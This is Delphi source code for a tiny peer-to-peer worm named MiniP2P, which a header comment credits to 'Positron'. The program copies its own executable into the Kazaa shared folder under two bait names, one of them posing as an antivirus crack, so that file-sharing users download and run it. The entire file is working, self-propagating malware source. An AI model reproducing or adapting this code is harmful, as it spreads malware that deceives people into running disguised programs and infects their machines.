   {-------------------------------------------------}
   { Very small Delphi P2P Worm created by Positron  }
   { Packed (FSG) exe size: 1504 Byte                }
   { Unpacked size: 4096 Byte                        }
   {                                                 }
   { Thanks to Nico!                                 }
   {-------------------------------------------------}

   {$A+,B-,C-,D-,E-,F-,G+,H+,I-,J-,K-,L-,M-,N+,O+,P+,Q-,R-,S-,T-,U-,V+,W-,X+,Y-,Z1}

   program MiniP2P;

   FUNCTION CopyFileA(lpExistingFileName,lpNewFileName:PChar;bFailIfExists:Boolean):Boolean;STDCALL;EXTERNAL Kernel32 name 'CopyFileA';
   FUNCTION GetModuleFileNameA(Module:Integer;Filename:PChar;Size:Integer):Integer;STDCALL;EXTERNAL Kernel32  name 'GetModuleFileNameA';

   VAR
     Buffer : ARRAY [0..260] OF Char;

   begin
     GetModuleFileNameA(0,Buffer,SizeOf(Buffer));
     CopyFileA(Buffer,'c:\Program Files\Kazaa\My Shared Folder\Fuck Britney.exe',False);
     CopyFileA(Buffer,'c:\Program Files\Kazaa\My Shared Folder\AVP_Crack.exe',False);
   end.
